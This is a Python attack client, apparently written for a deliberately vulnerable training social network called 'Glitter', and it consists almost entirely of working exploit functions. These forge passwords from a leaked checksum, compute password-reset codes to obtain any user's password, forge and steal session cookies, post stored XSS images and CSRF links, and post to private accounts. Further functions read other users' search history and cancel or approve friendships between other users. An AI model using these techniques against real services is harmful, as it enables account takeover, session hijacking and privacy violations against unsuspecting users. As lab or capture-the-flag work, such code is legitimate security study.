from glitter import *

cookie_list = []

def print_glits_info(sock: socket.socket, id: int) -> None:
    """

    This function prints the glits info.
    :parm sock: The socket to send the login request to.
    :type sock: socket.socket
    :parm id: The user id to get the glits info.
    :type id: int
    """
    glits_info = send_message(sock, protocol_messages["profile"] % id, cookie_list)
    glits_info = load_glitter_responses(glits_info, """505#Feed loading approved{gli&&er}""")

    for glit in range(1, len(glits_info["glits"]) + 1):
        print("""[{}] glit_id {}-> {}{} | content ->{} "{}"{} [{}{}{}]""".format(glit, 
        COLORS_OUTPUT["purple"], glits_info["glits"][glit - 1]["id"] , COLORS_OUTPUT["reset"],
        COLORS_OUTPUT["cyan"], glits_info["glits"][glit - 1]["content"], COLORS_OUTPUT["reset"],
        COLORS_OUTPUT["yellow"], glits_info["glits"][glit - 1]["date"], COLORS_OUTPUT["reset"]))


def data_from_search(sock: socket.socket, search_mode: str) -> dict:
    """
    This function gets the data from the search and converts it to a dict
    :parm sock: the socket
    :param search_mode: the search mode
    :type sock: socket.socket
    :type search_mode: str
    :return: a dict with the data
    :retype: dict
    """
    search_entry = input()

    string_to_send = protocol_messages["search"] % (search_mode, search_entry)
    data = send_message(sock, string_to_send, cookie_list)

    print("{}".format(COLORS_OUTPUT["green"] + "[+] search have sent!" + COLORS_OUTPUT["reset"]))

    data = load_glitter_responses(data, "305#Entities search result{gli&&er}")
    print("{}{}{}".format(COLORS_OUTPUT["purple"], data, COLORS_OUTPUT["reset"]))
    return data


def web_search(data: str, search_type: str, web_data: dict) -> dict:
    """
    This function uses the web search
    :parm data: data
    :parm search_type: simple/wild/id
    :return: dict with all info
    :rtype: dict
    """
    
    search_url = f"{ROOT_URL}/entities?searchType={search_type}&searchEntry={data}"
    data = web_get_request(search_url, web_data['sparkle'])
    print(COLORS_OUTPUT["green"] + "[+] search results [+]" + COLORS_OUTPUT["reset"])
    print(data)
    return data


def get_username(sock: socket.socket) -> tuple:
    """
    This function gets the username of any user
    :parm sock: the socket
    :type sock: socket.socket
    :return: the username & the user id 
    :retype: tuple
    """
    name = input("input a *SCREEN NAME* to get username: ")
    data = web_search(name, SEARCH_MODES[0], my_website_data)
    if len(data):
        spoof_id = data[0]["id"]
        data = send_message(sock, protocol_messages["settings"] % data[0]["id"], cookie_list)
        username_spoof = data[len("359#Invalid session for username: "):data.find("{gli&&er}")]
        print("{}[+]{} username is: {}{}{}".format(COLORS_OUTPUT["green"], COLORS_OUTPUT["reset"], COLORS_OUTPUT["green"], username_spoof, COLORS_OUTPUT["reset"]), end="")
        return username_spoof, spoof_id

    else:
        print("{}[-] user not found{}".format(COLORS_OUTPUT["red"], COLORS_OUTPUT["reset"]))
        return None, None


def spoof_login(sock: socket.socket) -> dict:
    """
    This function logs in to anybodys account and give you thier password
    :parm sock: the socket
    :type sock: socket.socket
    :return: dict with all globals
    :retype: dict
    """
    
    spoof_username = input("Enter username to log-in: ")

    msg = protocol_messages["login"] % (spoof_username, "doesnt matter")
    data = send_message(sock, msg, cookie_list)

    if "data.user_name should NOT be shorter than 5 characters" in data or "User doesn't exist" in data:
        print("[-] user not found")
        exit(0)

    else:
        checksum = data[len("108#Illegal user login. Provided details do not match ascii checksum: "):data.find("{gli&&er}")] # string slicing to get the checksum
        spoof_password = make_password(int(checksum), spoof_username)
        print("[+] fake password is: %s" % spoof_password)

        msg = protocol_messages["login"] % (spoof_username, spoof_password)
        send_message(sock, msg, cookie_list)
        data = send_message(sock, protocol_messages["checksum"] % int(checksum), cookie_list)
        
        my_info_dict = load_glitter_responses(data, "115#Authentication approved{gli&&er}")

    return my_info_dict


def opening_screen(sock: socket.socket) -> None:
    """
    This function is the opening function for the main and setting all of the global variables
    :parm sock: the socket
    :type sock: socket.socket
    """
    global my_info_dict, my_website_data, username, password, my_id

    print("hello! welcome to glitter exploit!")
    try:
        username = input("Enter your username: ")
        password = input("Enter your password: ")

    except KeyboardInterrupt:
        print("[-] exiting.")
        exit(0)

    my_website_data = web_login(username, password)
    if my_website_data:
        option = input("pick a login option => any key for regular login and 0 for spoofed login [In App] : ")
        if option != "0":
            my_info_dict = login(sock, username, password, cookie_list)

        else:
            my_info_dict = spoof_login(sock)

        username = my_info_dict["user_name"]
        password = my_info_dict["password"]
        my_id = int(my_info_dict["id"])

    else:
        exit(0)


def send_like(sock: socket.socket) -> None:
    """
    This function sends from me one like to my glitter post
    :parm sock: the socket
    :type sock: socket.socket
    :return: True if the like sending was successful, otherwise False
    :retype: bool
    """
    print_glits_info(sock, my_id)
    glit_id = input("input a id of the glit you want to like: ")
    if glit_id.isdigit():
        msg = protocol_messages["like"] % (int(glit_id), my_id, username)
        send_message(sock, msg, cookie_list)
        print("{}[+] like have sent to post -> {}{}".format(COLORS_OUTPUT["green"], glit_id, COLORS_OUTPUT["reset"]))
    
    else:
        print("{}[-] unvaild like id{}".format(COLORS_OUTPUT["red"], COLORS_OUTPUT["reset"]))


def send_wow(sock: socket.socket) -> None:
    """
    This function sends to a glit from me a wow unlimited times
    :parm sock: the socket
    :type socket: socket.socket
    """
    print_glits_info(sock, my_id)
    glit_id = input("input a id of the glit you want to like: ")

    if glit_id.isdigit():
        msg = protocol_messages["wow"] % (int(glit_id), my_id, my_info_dict["screen_name"])
        data = send_message(sock, msg, cookie_list)
        if "755#Wow pulish approved" in data:
            print("{}[+] cool wow have sent to post -> {}{}".format(COLORS_OUTPUT["green"], glit_id, COLORS_OUTPUT["reset"]))
        else:
            print("{}[-] wow failed to send, try again..{}".format(COLORS_OUTPUT["red"], COLORS_OUTPUT["reset"]))
    else:
        print("{}[-] invalid glit id!{}".format(COLORS_OUTPUT["red"], COLORS_OUTPUT["reset"]))


def xsrf_send_post(sock: socket.socket) -> None:
    """
    This function creates the xsrf glit to people to post in thier fid
    """
    post_content = '<a href=\'/glit?id=-1&feed_owner_id=-1&publisher_id=-1&publisher_screen_name=%s&publisher_avatar=im3&background_color=Orange&date=%s&content=Agam-Is-Here-lol&font_color=black\'>DONT CLICK</a>'
    post_content = post_content % (my_info_dict["screen_name"], time_parser("doesntMatter", 1))

    post_Getrequest = protocol_messages["post"] % (my_id, my_id, my_info_dict["screen_name"], "Pink", time_parser("doesntMatter", 1), post_content, "Black")
    send_message(sock, post_Getrequest, cookie_list)

    print(COLORS_OUTPUT["green"] + "[+] xsrf glit was published now on " + my_info_dict["screen_name"] + COLORS_OUTPUT["reset"])


def send_glit_xss(sock: socket.socket) -> None:
    """
    This function sends a glit from me to my glitter post and adds an image with xss
    :parm sock: the socket
    :type sock: socket.socket
    """
    xss_img = """<img src=\\"%s\\" width=\\"500\\" height=\\"200\\">""" % (input("input a image link or gif (gif is cooler): "))
    
    string_to_send = protocol_messages["post"] % (my_id, my_id, my_info_dict["screen_name"], "pink", time_parser("today", 1), xss_img, "orange")
    send_message(sock, string_to_send, cookie_list)

    print("{}[+] glit image xss have sent!{}".format(COLORS_OUTPUT["green"], COLORS_OUTPUT["reset"]))


def send_time_glit(sock: socket.socket) -> None:
    """
    This function sends a glit from me to my glitter post and adds a fake time in format
    :parm sock: the socket
    :type socket: socket.socket
    """
    fake_date = input("Enter a fake date in format: YYYY-MM-DD HH:MM:SS ").strip()
    fake_date = time_parser(fake_date, 0)

    string_to_send = protocol_messages["post"] % (my_id, my_id, my_info_dict["screen_name"], "pink", fake_date, "fake time post!", "black")
    send_message(sock, string_to_send, cookie_list)

    print("{}[+] fake time glit have sent!{}".format(COLORS_OUTPUT["green"], COLORS_OUTPUT["reset"]))


def send_private_glit_post(sock: socket.socket) -> None:
    """
    This function sends a glit post to any user that is private! 
    And this function can add a post glit to another user using any color they want even if it not on gliter
    :parm sock: the socket
    :type sock: socket.socket
    """
    print("input a *SCREEN NAME* to send post to: [can be private!] ")
    data = data_from_search(sock, SEARCH_MODES[0])
    date = time_parser("doesnt matter", 1)

    if data:
        content = input("input a content: ")
        color = input("input a color for your post: ").lower()

        if color not in COLORS:
            print("{}[-] color not found. using defult{}".format(COLORS_OUTPUT["red"], COLORS_OUTPUT["reset"]))
            color = "red"

        string_to_send = protocol_messages["post"] % (int(data[0]["id"]), my_id, my_info_dict["screen_name"], color, date, content, "black")
        send_message(sock, string_to_send, cookie_list)
        print("{}[+] glit post have sent to {}{}!".format(COLORS_OUTPUT["green"], int(data[0]["id"]), COLORS_OUTPUT["reset"]))
        
    else:
        print("{}[-] user not found{}".format(COLORS_OUTPUT["red"], COLORS_OUTPUT["reset"]))


def comment_private_post(sock: socket.socket) -> None:
    """
    This function comments under any private post .
    :parm sock: the socket
    :type sock: socket.socket
    """
    print("Enter screen name to comment & view his private posts: ")
    name_dict = data_from_search(sock, SEARCH_MODES[0])

    if len(name_dict):
        print_glits_info(sock, name_dict[0]["id"])
        post_id = input("Choose post id to comment under: ")

        if post_id.isdigit():
            content = input("Enter content: ")
            fake_date = input("Enter a fake date in format: YYYY-MM-DD HH:MM:SS ").strip()

            fake_date = time_parser(fake_date, 0)
            msg = protocol_messages["comment"] % (int(post_id), my_id, my_info_dict["screen_name"], content, fake_date)
            response = send_message(sock, msg, cookie_list)

            if "655#Comment publish approved" in response:
                print("{}[+] glit comment time have sent under {} account!{}".format(COLORS_OUTPUT["green"], name_dict[0]["screen_name"], COLORS_OUTPUT["reset"]))
            else:
                print("{}[-] check your post id again.{}".format(COLORS_OUTPUT["red"], COLORS_OUTPUT["reset"]))
        else:
            print("{}[-] unvaild post id.{}".format(COLORS_OUTPUT["red"], COLORS_OUTPUT["reset"]))
    else:
        print("{}[-] couldnt found this user. {}".format(COLORS_OUTPUT["red"], COLORS_OUTPUT["reset"]))


def build_reset_code(sock: socket.socket) -> list:
    """
    This function builds a reset code
    :parm sock: the socket
    :type sock: socket.socket
    :return: the reset code and the spoofed username
    :retype: list
    """
    username_spoof, id_spoof = get_username(sock) 

    if username_spoof and id_spoof:
        p1 = convert_id_str(id_spoof)
        current_time = time.strftime("%H%M")
        curret_date = time.strftime("%d%m")
        full_code = curret_date + p1 + current_time

        return [username_spoof, full_code] 

    return [None, None]


def get_password(sock: socket.socket) -> None:
    """
    This function gets the password of any user! by using recover password procedure
    :parm sock: the socket
    :type sock: socket.socket
    """
    url1 = f"{ROOT_URL}/password-recovery-code-request/"
    url2 = f"{ROOT_URL}/password-recovery-code-verification/"

    post_data = build_reset_code(sock)
    if post_data[0] and post_data[1]:
        requests.post(url1, json=post_data[0])
        step2 = requests.post(url2, json=post_data)
        print("\n{}[+]{} password is: {}{}{}".format(COLORS_OUTPUT["green"], COLORS_OUTPUT["reset"], COLORS_OUTPUT["green"], step2.text, COLORS_OUTPUT["reset"]))
    


def create_cookie(sock: socket.socket) -> str:
    """
    This function create a cookie session for any user
    :parm socket: the socket
    :type socket: socket.socket
    :return: the cookie
    :retype: str
    """
    cookie_username, _cookie_id = get_username(sock)

    md5_username_hash = hashlib.md5(cookie_username.encode('utf-8')).hexdigest()
    date = time.strftime("%d%m%Y")
    hour_time = datetime.datetime.now()

    cookie = "sparkle={}.{}.{}{}.{}".format(date, md5_username_hash, hour_time.hour, hour_time.minute, date)
    print("\n{}[+] The cookie for {} is: {}{}".format(COLORS_OUTPUT["purple"], cookie_username, cookie, COLORS_OUTPUT["reset"]))
    return cookie


def view_glanceship_status(sock: socket.socket, id: int) -> bool:
    """
    This function outputs the glances requests for any user
    :parm id: the id of the user
    :parm sock: the socket
    :type id: int
    :type sock: socket.socket
    :return: if there are glance requests
    :retype: bool
    """
    flag = True
    msg = protocol_messages["friendship-request"] % id
    msg = send_message(sock, msg, cookie_list)
    glances = load_glitter_responses(msg, "445#Updates load approved{gli&&er}")
    if not len(glances["glanceRequests"]):
        print("{}[-] No avliable friend requests!{}".format(COLORS_OUTPUT["red"], COLORS_OUTPUT["reset"]))
        flag = False

    for glance in glances["glanceRequests"]:
        print("{}[glance]{} from: {}{}{} | user id: {}{}{}".format(COLORS_OUTPUT["purple"], COLORS_OUTPUT["reset"],
                                                    COLORS_OUTPUT["cyan"], glance["initiator"]["screen_name"], COLORS_OUTPUT["reset"],
                                                    COLORS_OUTPUT["cyan"], glance["initiator"]["id"], COLORS_OUTPUT["reset"]))
    
    print("""Updates:\n{}""".format(glances["pushUpdates"]))
    return flag


def search_friendship_status(sock: socket.socket) -> tuple:
    """
    This function prints the friendships status for any user from input
    :parm sock: the socket
    :type sock: socket.socket
    :return: if the screen name was found & there are friendships requests and the data if its True
    :retype: bool
    """
    screen_name = input("Enter SCREEN NAME to view glance requests glances request: ")
    data_name = web_search(screen_name, SEARCH_MODES[0], my_website_data)

    if data_name:
        flag = view_glanceship_status(sock, data_name[0]["id"])
        return flag, data_name
        
    return False, False


def aprove_decline_glance_request(sock: socket.socket) -> None:
    """
    This function aproves or declines glance requests from any user
    :parm sock: the socket
    :type sock: socket.socket
    """
    flag, data_name = search_friendship_status(sock)

    if flag:
        try:
            user_id = input("Choose user id request from the list: ")
            option = input("Enter any key for accept this friend request and 0 to decline: ")

        except Exception:
            end_code(sock)

        if user_id.isdigit():
            data = (int(user_id), data_name[0]["id"])
            if option != "0":
                msg = protocol_messages["friend-accept"] % data
                response = send_message(sock, msg, cookie_list)
                if "Glance response is valid." in response:
                    print("{}[+] friend request aproved!{}".format(COLORS_OUTPUT["green"], COLORS_OUTPUT["reset"]))
            else:
                msg = protocol_messages["friend-decline"] % data
                response = send_message(sock, msg, cookie_list)
                if "Glance response is valid." in response:
                    print("{}[+] friend request declined!{}".format(COLORS_OUTPUT["green"], COLORS_OUTPUT["reset"]))
        else:
            print(COLORS_OUTPUT["red"] + "[-] user id unvaild." + COLORS_OUTPUT["reset"])


def cancel_friendship(sock: socket.socket) -> None:
    """
    This function cancels any friendship
    :parm sock: the socket
    :type sock: socket.socket
    """
    first_name = input("Enter screen name to cancel friendship with [the requester]: ")
    second_name = input("Enter the screen name you want cancel friendship with the user above: ")

    first_data = web_search(first_name, SEARCH_MODES[0], my_website_data)
    second_data = web_search(second_name, SEARCH_MODES[0], my_website_data)

    if len(first_data) and len(second_data):
        msg = protocol_messages["friendship-status"] % (second_data[0]["id"], first_data[0]["id"])
        response = send_message(sock, msg, cookie_list)

        if "405#Glanceship status response" in response:
            friendship_data = load_glitter_responses(response, "405#Glanceship status response{gli&&er}")

            if friendship_data["glanceship_type"] == "Glanced":
                msg = protocol_messages["friend-decline"] % (friendship_data["requester_user_id"], friendship_data["responder_user_id"])
                response = send_message(sock, msg, cookie_list)

                print("{} [+] FriendShip between {} & {} have been canceled. {}".format(COLORS_OUTPUT["green"], first_name, second_name, COLORS_OUTPUT["reset"]))
                return None

            else:
                print("{}[-] Both users have not glanced yet.{}".format(COLORS_OUTPUT["red"], COLORS_OUTPUT["reset"]))
                return None

    print("{}[-] couldn't found {} or {}.{}".format(COLORS_OUTPUT["red"], first_name, second_name, COLORS_OUTPUT["reset"]))


def history_view(_sock: socket.socket) -> None:
    """
    This function show all history search of any user.
    """
    screen_name = input("Enter SCREEN NAME to search history: ")
    screen_name_list = web_search(screen_name, SEARCH_MODES[0], my_website_data)

    if len(screen_name_list):
        history_url = "{}/history/{}".format(ROOT_URL, screen_name_list[0]['id'])
        history_list = web_get_request(history_url, my_website_data['sparkle'])
        history_list = json.dumps(history_list, indent=4, sort_keys=True)

        print(COLORS_OUTPUT["green"] + "[+] Search history for: " + screen_name + COLORS_OUTPUT["reset"])
        print(highlight(history_list, JsonLexer(), TerminalFormatter(style='monokia')))

    else:
        print(COLORS_OUTPUT["red"] + "[-] No user named: " + screen_name + COLORS_OUTPUT["reset"])


def steal_cookie_session(sock: socket.socket) -> None:
    """
    This function steals the cookie and session from the server
    :parm sock: the socket
    :type sock: socket.socket
    """
    screen_name = input("Enter a screename to check if he online -> and if he does; were going to steal his cookie: ")
    name_data = web_search(screen_name, SEARCH_MODES[0], my_website_data)
    if len(name_data):

        msg = protocol_messages["friend-request"] % (my_id, name_data[0]["id"])
        response = send_message(sock, msg, cookie_list)

        if "USER_NOT_LOGGED_ON_WEBSITE" in response:
            print("{}[+] {} isnt loged in glitter.{}".format(COLORS_OUTPUT["purple"], screen_name, COLORS_OUTPUT["reset"]))
        
        elif "415#Glance request is valid." in response:
            cookie = response[len("415#Glance request is valid. A notification was sent to the user on session: "):response.find("{")]
            print("\n{}[+] cookie and session have stolen!\nCookie: {} {}".format(COLORS_OUTPUT["green"], cookie, COLORS_OUTPUT["reset"])) 
            cookie_list.append({"Cookie": cookie})

    else:
        print("{}[-] cant find {}.. {}".format(COLORS_OUTPUT["red"], screen_name, COLORS_OUTPUT["reset"]))
        

def print_cookies(_sock: socket.socket):
    """
    This function prints all cookies that have been collected till now
    """
    print(cookie_list)


def end_code(sock: socket.socket) -> None:
    """
    This function logs out and closes sockets
    :parm socket: the socket
    :type socket: socket.socket
    """ 
    print("{}[-] exiting{}".format(COLORS_OUTPUT["red"], COLORS_OUTPUT["reset"]))
    logout(sock, my_id, cookie_list)
    logout_website(my_id)
    sock.close()
    exit(0)

def main():
    dict_funcs = {"710": {"a": send_like},
                  "750" : {"a": send_wow},
                  "550": {"a": send_glit_xss, 
                          "b": send_time_glit},
                  "650": {"a": comment_private_post},
                  "300": {"a": send_private_glit_post},
                  "350": {"a": get_username},
                  "410": {"a": steal_cookie_session},
                  "420": {"a": aprove_decline_glance_request},
                  "430": {"a": aprove_decline_glance_request,
                          "b": cancel_friendship},
                  "440": {"a": search_friendship_status},
                  "challenge": {"a": get_password,
                                "b": create_cookie,
                                "c": xsrf_send_post,
                                "d": history_view},
                    "cookie": {"a": print_cookies}}

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(GLITTER_ADDRESS)
    print("{}[+] connected to glitter{}".format(COLORS_OUTPUT["purple"], COLORS_OUTPUT["reset"]))
    
    opening_screen(sock)
    print_glits_info(sock, my_id)

    while True:
        print_manual()
        try:
            option = input("option: ")

        except KeyboardInterrupt:
            end_code(sock)

        if option == "exit":
            end_code(sock)

        try:
            if option in dict_funcs:
                dict_funcs[option][input("pick -> [a][b][c][...][N]: ")](sock)

        except KeyError:
            print("invalid option")
    
    

if __name__ == "__main__":
    main()